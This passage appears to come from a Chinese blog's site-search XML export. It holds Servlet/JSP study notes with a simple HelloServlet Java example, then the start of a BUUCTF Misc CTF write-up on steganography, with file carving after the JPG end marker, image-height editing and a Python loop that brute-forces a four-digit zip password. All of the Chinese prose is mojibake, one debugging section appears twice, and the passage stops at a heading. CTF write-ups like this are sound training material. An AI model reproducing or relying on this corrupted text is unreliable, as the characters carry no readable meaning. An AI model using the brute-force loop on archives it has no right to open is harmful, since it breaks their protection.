é¦–æ¬¡è½½å…¥æ—¶ï¼Œæ‰§è¡Œå¤æ‚çš„åˆå§‹åŒ–ä»»åŠ¡ï¼Œä½†å¹¶ä¸æƒ³æ¯ä¸ªè¯·æ±‚éƒ½é‡å¤è¿™äº›ä»»åŠ¡ã€‚init æ–¹æ³•å°±æ˜¯ä¸“é—¨é’ˆå¯¹è¿™ç§æƒ…å†µè®¾è®¡ï¼›å®ƒåœ¨ Servlet åˆæ¬¡åˆ›å»ºæ—¶è¢«è°ƒç”¨ï¼Œä¹‹åå¤„ç†æ¯ä¸ªç”¨æˆ·çš„è¯·æ±‚æ—¶ï¼Œåˆ™ä¸å†è°ƒç”¨è¿™ä¸ªæ–¹æ³•ã€‚å› æ­¤ï¼Œå®ƒä¸»è¦ç”¨äºä¸€æ¬¡æ€§çš„åˆå§‹åŒ–ï¼Œå’Œ applet çš„ init æ–¹æ³•ç›¸åŒã€‚Servlet ä¸€èˆ¬åœ¨ç”¨æˆ·é¦–æ¬¡è°ƒç”¨å¯¹åº”çš„ Servlet çš„ URL æ—¶åˆ›å»ºï¼Œä½†ä¹Ÿå¯ä»¥æŒ‡å®š Servlet åœ¨æœåŠ¡å™¨å¯åŠ¨åè½½å…¥ã€‚</p><p>â€‹init æ–¹æ³•æ‰§è¡Œä¸¤ç§ç±»å‹çš„åˆå§‹åŒ–ï¼šå¸¸è§„åˆå§‹åŒ–ï¼Œä»¥åŠç”±åˆå§‹åŒ–å‚æ•°æ§åˆ¶çš„åˆå§‹åŒ–ã€‚</p><ol><li><p><strong>å¸¸è§„åˆå§‹åŒ–ï¼š</strong></p><p>init åªæ˜¯åˆ›å»ºæˆ–è½½å…¥åœ¨ Servlet å£°æ˜å‘¨æœŸå†…ç”¨åˆ°çš„ä¸€äº›æ•°æ®ï¼Œæˆ–è€…æ‰§è¡ŒæŸäº›ä¸€æ¬¡æ€§çš„è®¡ç®—ã€‚</p></li><li><p><strong>ç”±åˆå§‹åŒ–å‚æ•°æ§åˆ¶çš„åˆå§‹åŒ–ï¼š</strong></p></li></ol><h2 id="364-destroy-æ–¹æ³•"><a class="markdownIt-Anchor" href="#364-destroy-æ–¹æ³•">#</a> 3.6.4ã€destroy æ–¹æ³•ï¼š</h2><p>â€‹æœåŠ¡å™¨å¯èƒ½ä¼šå†³å®šç§»é™¤ä¹‹å‰è½½å…¥çš„ Servlet å®ä¾‹ï¼Œæˆ–è®¸å› ä¸ºæœåŠ¡å™¨çš„ç®¡ç†å‘˜è¦æ±‚å®ƒè¿™æ ·åšã€‚ä½†æ˜¯ï¼Œåœ¨æœåŠ¡å™¨ç§»é™¤ Servlet çš„å®ä¾‹ä¹‹å‰ï¼Œå®ƒä¼šè°ƒç”¨ Servlet çš„ destroy æ–¹æ³•ï¼Œä»è€Œä½¿å¾— Servlet æœ‰æœºä¼šå…³é—­æ•°æ®åº“è¿æ¥ã€åœæ­¢åå°çš„çº¿ç¨‹ã€å°† Cookie åˆ—è¡¨å’Œç‚¹å‡»è®¡æ•°å†™å…¥åˆ°ç£ç›˜ã€å¹¶æ‰§è¡Œå…¶ä»–æ¸…ç†æ´»åŠ¨ã€‚ä½†æ˜¯ï¼Œè¦æ„è¯†åˆ° Web æœåŠ¡å™¨æœ‰å¯èƒ½å´©æºƒã€‚å› æ­¤ï¼Œä¸è¦å°† destroy æœºåˆ¶ä½œä¸ºå‘ç£ç›˜ä¸Šä¿å­˜çŠ¶æ€çš„å”¯ä¸€æœºåˆ¶ã€‚å¦‚æœæœåŠ¡å™¨æ‰§è¡Œè¯¸å¦‚ç‚¹å‡»è®¡æ•°ï¼Œæˆ–å¯¹ Cookie å€¼çš„åˆ—è¡¨è¿›è¡Œç´¯åŠ ç­‰æ´»åŠ¨ï¼Œåº”è¯¥ä¸»åŠ¨åœ°å®šæœŸå°†æ•°æ®å†™åˆ°ç£ç›˜ä¸Šã€‚</p><h1 id="37-singlethreadmodel-æ¥å£"><a class="markdownIt-Anchor" href="#37-singlethreadmodel-æ¥å£">#</a> 3.7ã€SingleThreadModel æ¥å£ï¼š</h1><p>â€‹<strong>æ³¨ï¼šç”±äºæˆ‘ç¼ºå°‘å‰ç½®çŸ¥è¯†ï¼Œæ‰€ä»¥è¿™éƒ¨åˆ†å†…å®¹å…ˆä¸´æ—¶è·³è¿‡ï¼Œå€Ÿé‰´æˆ‘çš„åšå®¢å†…å®¹å­¦ä¹ çš„å¸ˆå‚…å¯ä»¥å»æ”¯æŒä¸‹è¿™æœ¬ä¹¦ã€‚</strong></p><h1 id="38-servlet-çš„è°ƒè¯•"><a class="markdownIt-Anchor" href="#38-servlet-çš„è°ƒè¯•">#</a> 3.8ã€Servlet çš„è°ƒè¯•ï¼š</h1><p>â€‹å¦‚ä¸‹ï¼Œä¹¦ä¸­åˆ—å‡ºäº†ä¸€éƒ¨åˆ†çš„è°ƒè¯•æŠ€å·§ï¼š</p><ol><li>ä½¿ç”¨æ‰“å°è¯­å¥ã€‚</li><li>ä½¿ç”¨é›†æˆåœ¨ IDE ä¸­çš„è°ƒè¯•å™¨ã€‚</li><li>ä½¿ç”¨æ—¥å¿—æ–‡ä»¶ã€‚</li><li>ä½¿ç”¨ Apache Log4Jã€‚</li><li>ç¼–å†™ç‹¬ç«‹ç±»ã€‚</li><li>é¢„å…ˆåšå¥½æ•°æ®ç¼ºå¤±æˆ–å¼‚å¸¸çš„å‡†å¤‡ã€‚</li><li>æ£€æŸ¥ HTML æºä»£ç ã€‚</li><li>å•ç‹¬æ£€æŸ¥è¯·æ±‚æ•°æ®ã€‚</li><li>å•ç‹¬æ£€æŸ¥å“åº”æ•°æ®ã€‚</li><li>åœæ­¢å’Œé‡å¯æœåŠ¡å™¨ã€‚<br><strong>æ³¨ï¼šç”±äºæˆ‘ç¼ºå°‘å‰ç½®çŸ¥è¯†ï¼Œæ‰€ä»¥è¿™éƒ¨åˆ†å†…å®¹å…ˆä¸´æ—¶è·³è¿‡ï¼Œå€Ÿé‰´æˆ‘çš„åšå®¢å†…å®¹å­¦ä¹ çš„å¸ˆå‚…å¯ä»¥å»æ”¯æŒä¸‹è¿™æœ¬ä¹¦ã€‚</strong></li></ol><h1 id="38-servlet-çš„è°ƒè¯•-2"><a class="markdownIt-Anchor" href="#38-servlet-çš„è°ƒè¯•-2">#</a> 3.8ã€Servlet çš„è°ƒè¯•ï¼š</h1><p>â€‹å¦‚ä¸‹ï¼Œä¹¦ä¸­åˆ—å‡ºäº†ä¸€éƒ¨åˆ†çš„è°ƒè¯•æŠ€å·§ï¼š</p><ol><li>ä½¿ç”¨æ‰“å°è¯­å¥ã€‚</li><li>ä½¿ç”¨é›†æˆåœ¨ IDE ä¸­çš„è°ƒè¯•å™¨ã€‚</li><li>ä½¿ç”¨æ—¥å¿—æ–‡ä»¶ã€‚</li><li>ä½¿ç”¨ Apache Log4Jã€‚</li><li>ç¼–å†™ç‹¬ç«‹ç±»ã€‚</li><li>é¢„å…ˆåšå¥½æ•°æ®ç¼ºå¤±æˆ–å¼‚å¸¸çš„å‡†å¤‡ã€‚</li><li>æ£€æŸ¥ HTML æºä»£ç ã€‚</li><li>å•ç‹¬æ£€æŸ¥è¯·æ±‚æ•°æ®ã€‚</li><li>å•ç‹¬æ£€æŸ¥å“åº”æ•°æ®ã€‚</li><li>åœæ­¢å’Œé‡å¯æœåŠ¡å™¨ã€‚</li></ol>]]></content>
      
      
      <categories>
          
          <category> Javaä»å…¥é—¨åˆ°å…¥ç‹± </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä¸€ã€Servletå’ŒJSPæŠ€æœ¯æ¦‚è¿°</title>
      <link href="/posts/3fe30769.html"/>
      <url>/posts/3fe30769.html</url>
      
        <content type="html"><![CDATA[<p><strong>æ³¨ï¼šè¯¥ç³»åˆ—ç¬”è®°æ˜¯ç”¨äºæˆ‘åœ¨ ã€ŠServlet ä¸ JSP æ ¸å¿ƒç¼–ç¨‹ã€‹è¿™æœ¬ä¹¦ä¸­çš„å­¦ä¹ ç¬”è®°ï¼Œæ— å…¶ä»–æ„æ€ï¼Œä¾µæƒè¯·è”ç³» 2082045221@qq.com åˆ é™¤ã€‚</strong></p><p>â€‹ç¬¬ä¸€ç« å†…å®¹è¾ƒå°‘ï¼Œæ‰€ä»¥æš‚æ—¶æœ‰ç”¨çš„ç¬”è®°ä¹Ÿä¸å¤šã€‚</p><h1 id="11-servlet-çš„åŠŸç”¨"><a class="markdownIt-Anchor" href="#11-servlet-çš„åŠŸç”¨">#</a> 1.1ã€Servlet çš„åŠŸç”¨ï¼š</h1><p>â€‹Servlet æ˜¯è¿è¡Œåœ¨ Web æœåŠ¡å™¨æˆ–åº”ç”¨æœåŠ¡å™¨ä¸Šçš„ Java ç¨‹åºï¼Œå®ƒæ˜¯ä¸€ä¸ªï¼Œè´Ÿè´£è¿æ¥æ¥è‡ª Web æµè§ˆå™¨æˆ–å…¶ä»– HTTP å®¢æˆ·ç¨‹åºçš„è¯·æ±‚å’Œ HTTP æœåŠ¡å™¨ä¸Šçš„æ•°æ®åº“æˆ–åº”ç”¨ç¨‹åºã€‚Servlet çš„å·¥ä½œæ˜¯æ‰§è¡Œä¸‹é¢çš„ä»»åŠ¡ï¼Œå¦‚å›¾ 1.1 æ‰€ç¤ºï¼š</p><p><img data-src="https://img-blog.csdnimg.cn/direct/764d654f16ff499ca886496abc121f94.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><ol><li><p>è¯»å–å®¢æˆ·å‘é€çš„æ˜¾å¼æ•°æ®ã€‚</p><p>æœ€ç»ˆç”¨æˆ·ä¸€èˆ¬åœ¨ç½‘é¡µçš„ HTML è¡¨å•ä¸­è¾“å…¥çš„è¿™äº›æ•°æ®ã€‚ç„¶è€Œï¼Œæ•°æ®è¿˜æœ‰å¯èƒ½æ¥è‡ªäº Applet æˆ–å®šåˆ¶çš„ HTTP å®¢æˆ·ç¨‹åºã€‚</p></li><li><p>è¯»å–ç”±æµè§ˆå™¨å‘é€çš„éšå¼è¯·æ±‚æ•°æ®ã€‚</p><p>å›¾ 1.1 ä¸­æ˜¾ç¤ºäº†ä¸€æ¡ä»å®¢æˆ·ç«¯åˆ° Web æœåŠ¡å™¨ï¼ˆServlet å’Œ JSP æ‰€åœ¨çš„å±‚ï¼‰çš„å•ç®­å¤´ï¼Œä½†å®é™…ä¸Šä»å®¢æˆ·ç«¯ä¼ é€åˆ°  Web æœåŠ¡å™¨çš„æ•°æ®æœ‰ä¸¤ç§ï¼Œå®ƒä»¬åˆ†åˆ«ä¸ºç”¨æˆ·åœ¨è¡¨å•ä¸­è¾“å…¥çš„æ˜¾å¼æ•°æ®ï¼Œä»¥åŠåå°çš„ HTTP ä¿¡æ¯ã€‚ä¸¤ç§æ•°æ®éƒ½å¾ˆé‡è¦ã€‚HTTP ä¿¡æ¯åŒ…æ‹¬ Cookieã€æµè§ˆå™¨æ‰€èƒ½è¯†åˆ«çš„åª’ä½“ç±»å‹å’Œå‹ç¼©æ¨¡å¼ç­‰ã€‚</p></li><li><p>ç”Ÿæˆç»“æœã€‚</p><p>è¿™ä¸ªè¿‡ç¨‹å¯èƒ½éœ€è¦è®¿é—®æ•°æ®åº“ã€æ‰§è¡Œ RMI æˆ– EJB è°ƒç”¨ ã€è°ƒç”¨ Web æœåŠ¡ï¼Œæˆ–è€…ç›´æ¥è®¡ç®—å¾—å‡ºå¯¹åº”çš„å“åº”ã€‚å®é™…çš„æ•°æ®å¯èƒ½å­˜å‚¨åœ¨å…³ç³»å‹æ•°æ®åº“ä¸­ã€‚è¯¥æ•°æ®åº“å¯èƒ½ä¸ç†è§£ HTTP ï¼Œæˆ–è€…ä¸èƒ½è¿”å› HTML å½¢å¼çš„ç»“æœï¼Œæ‰€ä»¥ Web æµè§ˆå™¨ä¸èƒ½ç›´æ¥ä¸æ•°æ®åº“è¿›è¡Œä¼šè¯ã€‚åŠæ—¶èƒ½å¤Ÿåšåˆ°è¿™ä¸€ç‚¹ï¼Œä¸ºäº†å®‰å…¨ï¼Œä¹Ÿä¸å¸Œæœ›è®©å®ƒè¿™ä¹ˆåšã€‚å¯¹äºå¤§å¤šæ•°å…¶ä»–åº”ç”¨ç¨‹åºï¼Œä¹Ÿå­˜åœ¨ç±»ä¼¼çš„é—®é¢˜ã€‚å› æ­¤ï¼Œéœ€è¦ Web ä¸­é—´å±‚ä» HTTP æµä¸­æå–è¾“å…¥æ•°æ®ï¼Œä¸åº”ç”¨ç¨‹åºä¼šè¯ï¼Œå¹¶å°†ç»“æœåµŒå…¥åˆ°æ–‡æ¡£ä¸­ã€‚</p></li><li><p>å‘å®¢æˆ·å‘é€æ˜¾å¼æ•°æ®ï¼ˆå³æ–‡æ¡£ï¼‰ã€‚</p><p>è¿™ä¸ªæ–‡æ¡£å¯ä»¥ç”¨å„ç§å‘é€ï¼ŒåŒ…æ‹¬æ–‡æœ¬ï¼ˆHTML æˆ– XMLï¼‰ï¼ŒäºŒè¿›åˆ¶ï¼ˆGIF å›¾ï¼‰ï¼Œç”šè‡³å¯ä»¥æ˜¯å»ºç«‹åœ¨å…¶ä»–åº•å±‚æ ¼å¼ï¼Œå¦‚ gzipã€‚ä½†æ˜¯ï¼Œåˆ°ç›®å‰ä¸ºæ­¢ï¼ŒHTML æ˜¯æœ€å¸¸ç”¨çš„æ ¼å¼ï¼Œæ•…è€Œ Servlet å’Œ JSP çš„é‡è¦ä»»åŠ¡ä¹‹ä¸€å°±æ˜¯å°†ç»“æœåŒ…è£…åˆ° HTML ä¸­ã€‚</p></li><li><p>å‘é€éšå¼çš„ HTTP å“åº”æ•°æ®ã€‚</p><p>å›¾ 1.1 ä¸­æ˜¾ç¤ºäº†ä¸€æ¡ä» Web ä¸­é—´å±‚ï¼ˆServlet æˆ– JSP é¡µé¢ï¼‰åˆ°å®¢æˆ·ç«¯çš„å•ç®­å¤´ã€‚ä½†æ˜¯ï¼Œå®é™…å‘é€çš„æ•°æ®æœ‰ä¸¤ç§ï¼šæ–‡æ¡£æœ¬èº«ï¼Œä»¥åŠåå°çš„ HTTP ä¿¡æ¯ã€‚åŒæ ·ï¼Œä¸¤ç§æ•°æ®å¯¹å¼€å‘æ¥è¯´éƒ½æ˜¯è‡³å…³é‡è¦çš„ã€‚HTTP å“åº”æ•°æ®çš„å‘é€è¿‡ç¨‹æ¶‰åŠå‘ŠçŸ¥æµè§ˆå™¨æˆ–å…¶ä»–å®¢æˆ·ç¨‹åºæ‰€è¿”å›æ–‡æ¡£çš„ç±»å‹ï¼ˆä¾‹å¦‚ HTMLï¼‰ï¼Œæ˜¯æŒ‡ Cookie å’Œç¼“å­˜å‚æ•°ï¼Œä»¥åŠå…¶ä»–ç±»ä¼¼çš„ä»»åŠ¡ã€‚</p></li></ol><h1 id="12-åŠ¨æ€æ„å»ºç½‘é¡µçš„åŸå› "><a class="markdownIt-Anchor" href="#12-åŠ¨æ€æ„å»ºç½‘é¡µçš„åŸå› ">#</a> 1.2ã€åŠ¨æ€æ„å»ºç½‘é¡µçš„åŸå› ï¼š</h1><p>â€‹å®æ—¶æ„å»ºç½‘é¡µçš„ç†ç”±ï¼š</p><ul><li><p>ç½‘é¡µåŸºäºå®¢æˆ·å‘é€çš„æ•°æ®ã€‚</p></li><li><p>ç½‘é¡µç”±é¢‘ç¹æ”¹å˜çš„æ•°æ®å¯¼å‡ºã€‚</p></li><li><p>ç½‘é¡µä¸­ä½¿ç”¨äº†æ¥è‡ªå…¬å¸æ•°æ®åº“æˆ–å…¶ä»–æœåŠ¡å™¨ç«¯æ•°æ®æºçš„ä¿¡æ¯ã€‚</p><p>ç†è®ºä¸Šè®²ï¼ŒServlet å¹¶éåªç”¨äºå¤„ç† HTTP è¯·æ±‚çš„ Web æœåŠ¡å™¨æˆ–åº”ç”¨æœåŠ¡å™¨ï¼Œå®ƒåŒæ ·å¯ä»¥ç”¨äºå…¶ä»–ç±»å‹çš„æœåŠ¡å™¨ã€‚è€Œä¸”ï¼Œç”¨äºä¼šè¯å¯åŠ¨åè®®ï¼ˆSession Initiation Protocolï¼Œ SIPï¼‰æœåŠ¡å™¨çš„ Servlet API æœ€è¿‘å·²ç»è¢«æ ‡å‡†åŒ–ã€‚ä½†æ˜¯åœ¨å®è·µä¸­ï¼ŒServlet çš„è¿™ç§ç”¨æ³•å°šä¸æµè¡Œï¼Œæ‰€ä»¥ä»¥ä¸‹éƒ½åªè¯´ HTTP Servlet ã€‚</p></li></ul><h1 id="13-servlet-ä»£ç åˆæ¢"><a class="markdownIt-Anchor" href="#13-servlet-ä»£ç åˆæ¢">#</a> 1.3ã€Servlet ä»£ç åˆæ¢ï¼š</h1><p>â€‹ç°åœ¨ï¼Œå…ˆå¿«é€Ÿåœ°è§‚å¯Ÿä¸€ä¸ªç®€å•çš„ Servlet ï¼Œä»¥å¯¹å®ƒçš„å¤æ‚ç¨‹åº¦æœ‰ä¸€ä¸ªåŸºæœ¬çš„äº†è§£ã€‚</p><p>â€‹é¦–å…ˆï¼Œç»™ä¸€ä¸ªç®€å•çš„ Servlet ä»£ç ï¼Œå®ƒå‘å®¢æˆ·ç«¯è¾“å‡ºäº†ä¸€ä¸ªç®€å•çš„ HTML é¡µé¢ï¼Œä¸è¿‡éœ€è¦æ³¨æ„ä»¥ä¸‹å‡ ç‚¹ï¼š</p><ul><li>å®ƒæ˜¯å¸¸è§„çš„ Java ä»£ç ã€‚</li><li>å®ƒæœ‰ä¸ç†Ÿæ‚‰çš„é‡è¦è¯­å¥ã€‚</li><li>å®ƒå¯¹æ ‡å‡†çš„ç±»ï¼ˆHttpServletï¼‰è¿›è¡Œäº†æ‰©å±•ã€‚</li><li>å®ƒè¦†ç›–ï¼ˆoverrideï¼‰äº† doGet æ–¹æ³•ã€‚</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.firstweb.study01;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(&quot;/hello&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        resp.setContentType(<span class="string">&quot;text/html&quot;</span>);</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> resp.getWriter();</span><br><span class="line">        <span class="type">String</span> <span class="variable">docType</span> <span class="operator">=</span></span><br><span class="line">                <span class="string">&quot;&lt;!DOCTYPE HTML PUBLIC \&quot;-//W3C//DTD HTML 4.0&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;Transitional//EN\&quot;&gt;\n&quot;</span>;</span><br><span class="line">        out.println(docType +</span><br><span class="line">                <span class="string">&quot;&lt;HTML&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&lt;HEAD&gt;&lt;TITLE&gt;Hello&lt;/TITLE&gt;&lt;HEAD&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&lt;BODY BGCOLOR=\&quot;#FDF5E6\&quot;&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&lt;H1&gt;Hello&lt;/H1&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&lt;/BODY&gt;&lt;/HTML&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¾“å‡ºç»“æœå¦‚ä¸‹ï¼š</p><p><img data-src="https://img-blog.csdnimg.cn/direct/d18f9356267b41459a74fd01cd064c76.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h1 id="14-jsp-çš„ä½œç”¨"><a class="markdownIt-Anchor" href="#14-jsp-çš„ä½œç”¨">#</a> 1.4ã€JSP çš„ä½œç”¨ï¼š</h1><pre><code>ä¸ºäº†ç®€åŒ–èµ·è§ï¼ŒæŸç§ç¨‹åº¦ä¸Šï¼Œå¯ä»¥å°† Servlet çœ‹ä½œæ˜¯å«æœ‰ HTML çš„ Java ç¨‹åºï¼šå°† JSP çœ‹ä½œæ˜¯å«æœ‰ Java ä»£ç çš„ HTML é¡µé¢ã€‚</code></pre>]]></content>
      
      
      <categories>
          
          <category> Javaä»å…¥é—¨åˆ°å…¥ç‹± </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF-Misc-ç¬¬ä¸€é¡µ(1-16)</title>
      <link href="/posts/d63a55bd.html"/>
      <url>/posts/d63a55bd.html</url>
      
        <content type="html"><![CDATA[<h1 id="misc-buuåˆ·é¢˜-ç¬¬ä¸€é¡µ"><a class="markdownIt-Anchor" href="#misc-buuåˆ·é¢˜-ç¬¬ä¸€é¡µ">#</a> Misc-BUU åˆ·é¢˜ - ç¬¬ä¸€é¡µ</h1><h2 id="1ç­¾åˆ°"><a class="markdownIt-Anchor" href="#1ç­¾åˆ°">#</a> 1. ç­¾åˆ°ï¼š</h2><pre><code>flagåœ¨é¢˜ç›®æè¿°é‡Œï¼Œç›´æ¥äº¤äº†ã€‚</code></pre><h2 id="2é‡‘èƒ–"><a class="markdownIt-Anchor" href="#2é‡‘èƒ–">#</a> 2. é‡‘èƒ–ï¼š</h2><pre><code>æ²¡æœ‰é¢˜ç›®æè¿°ã€‚é¢˜ç›®æ˜¯ä¸€ä¸ªgifæ–‡ä»¶ï¼Œæ”¾åˆ°prç­‰è½¯ä»¶é‡Œé€å¸§çœ‹å°±å¯ä»¥äº†ï¼Œflag&#123;he11ohongke&#125;</code></pre><h2 id="3ä½ ç«Ÿç„¶èµ¶æˆ‘èµ°"><a class="markdownIt-Anchor" href="#3ä½ ç«Ÿç„¶èµ¶æˆ‘èµ°">#</a> 3. ä½ ç«Ÿç„¶èµ¶æˆ‘èµ°:</h2><pre><code>é™„ä»¶æ˜¯ä¸€ä¸ªjpgæ–‡ä»¶ï¼Œä½†æ˜¯ï¼Œæ‰“å¼€å•¥éƒ½æ²¡æœ‰ã€‚</code></pre><p><img data-src="https://img-blog.csdnimg.cn/direct/023e9e456e124c96a7064953c4f3dd0c.jpeg#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><pre><code>ç›´æ¥ç”¨è®°äº‹æœ¬æ‰“å¼€ï¼Œç¿»åˆ°æœ€åº•ä¸‹ï¼Œflag&#123;stego_is_s0_bor1ing&#125;</code></pre><h2 id="4äºŒç»´ç "><a class="markdownIt-Anchor" href="#4äºŒç»´ç ">#</a> 4. äºŒç»´ç ï¼š</h2><pre><code>å›¾ç‰‡æ˜¯ä¸ªäºŒç»´ç ï¼Œè¿™é‡Œä¸æ”¾å‡ºæ¥äº†ï¼Œæ‰«äº†ä¹‹åæ²¡å•¥å†…å®¹ï¼Œé‚£ä¹ˆè®°äº‹æœ¬çœ‹çœ‹ï¼Œå­˜åœ¨ä¸€ä¸ª4number.txtçš„ä¸€ä¸ªæ–‡ä»¶ï¼Œé‚£ä¹ˆï¼Œé€šè¿‡010editoræ‰“å¼€å›¾ç‰‡åˆ†æï¼Œå‘ç°å›¾ç‰‡é‡Œé¢å«æœ‰ä¸€ä¸ªtxtæ–‡ä»¶ï¼Œè¿˜æ˜¯åœ¨å‹ç¼©åŒ…ä¸­ã€‚</code></pre><p><img data-src="https://img-blog.csdnimg.cn/direct/42f5b1d576ca41ab84588b0601ae5891.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><blockquote><p><strong>è¡¥å……çŸ¥è¯†ï¼š</strong><br>ä¸€ä¸ªå®Œæ•´çš„ JPG æ–‡ä»¶ç”± FF D8 å¼€å¤´ï¼ŒFF D9 ç»“å°¾<br>åœ¨ä½¿ç”¨å›¾ç‰‡æµè§ˆå™¨æ—¶ï¼Œå›¾ç‰‡æµè§ˆå™¨ä¼šå¿½ç•¥ FF D9 ä»¥åçš„å†…å®¹ï¼Œå› æ­¤å¯ä»¥åœ¨ JPG æ–‡ä»¶ä¸­åŠ å…¥å…¶ä»–æ–‡ä»¶ã€‚å…¶ä»–æ–‡ä»¶éšè—å¦‚ png.gif æ–‡ä»¶éšè—ä¹Ÿæ˜¯è¿™ä¸ªé“ç†ã€‚</p></blockquote><pre><code>ç›´æ¥åœ¨linuxä¸­ä½¿ç”¨foremoståˆ†ç¦»å‹ç¼©åŒ…ï¼Œä¹‹åæˆåŠŸæ‹¿åˆ°ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œæ‰“å¼€æœ‰ä¸ª4number.txtæ–‡ä»¶ï¼Œä½†æ˜¯æ˜¯åŠ å¯†çš„ã€‚ä¹‹åé€šè¿‡è¿™ä¸ªè„šæœ¬æ¥çˆ†ç ´è¿™ä¸ªå¯†ç å³å¯ï¼š</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">9999</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        f = zipfile.ZipFile(<span class="string">&quot;./output/zip/00000000.zip&quot;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">        f.extract(<span class="string">&quot;4number.txt&quot;</span>,pwd=<span class="string">f&quot;<span class="subst">&#123;i&#125;</span>&quot;</span>.encode())</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;å¯†ç æ˜¯<span class="subst">&#123;i&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><pre><code>æœ€åæˆåŠŸå¾—åˆ°flagï¼šflag&#123;vjpw_wnoei&#125;</code></pre><h2 id="5å¤§ç™½"><a class="markdownIt-Anchor" href="#5å¤§ç™½">#</a> 5. å¤§ç™½:</h2><pre><code>é¢˜ç›®æè¿°ï¼šçœ‹ä¸åˆ°å›¾ï¼Ÿ æ˜¯ä¸æ˜¯å±å¹•å¤ªå°äº†</code></pre><p><img data-src="https://img-blog.csdnimg.cn/img_convert/d2fcef14ca008586d5f3830bd1c4ed79.png" alt="image-20220727085631438"></p><pre><code>é¢˜ç›®æè¿°çš„æ˜¯å±å¹•å¤ªå°äº†ï¼Œä½†æ˜¯ï¼Œæ„Ÿè§‰å¹¶ä¸æ˜¯å±å¹•çš„é—®é¢˜ï¼Œåº”è¯¥æ˜¯å›¾ç‰‡å¤§å°çš„é—®é¢˜ï¼Œè¿˜æœ‰ä¸€éƒ¨åˆ†çš„å›¾ç‰‡è¢«éšè—èµ·æ¥äº†ã€‚ä¿®æ”¹å›¾ç‰‡çš„å¤§å°è¯•è¯•çœ‹ï¼š</code></pre><p><img data-src="https://img-blog.csdnimg.cn/direct/aedc385a6b7c4356b699fd770e53b961.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><pre><code>ä¿®æ”¹çº¢è‰²çš„è¿™ä¸€éƒ¨åˆ†ï¼Œä¿®æ”¹çš„å€¼å’Œå‰é¢æŸéƒ¨åˆ†ä¸€æ ·ï¼Œéšåå¾—åˆ°äº†æ–°çš„å›¾ç‰‡ï¼Œæ‰“å¼€çœ‹çœ‹ï¼š</code></pre><p><img data-src="https://img-blog.csdnimg.cn/direct/c938b2b70f264d9897cf0a0636369dd8.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><pre><code>æœ€åæ‹¿åˆ°flag</code></pre><h2 id="6é¸Ÿé•‡"><a class="markdownIt-Anchor" href="#6é¸Ÿé•‡">#</a> 6. 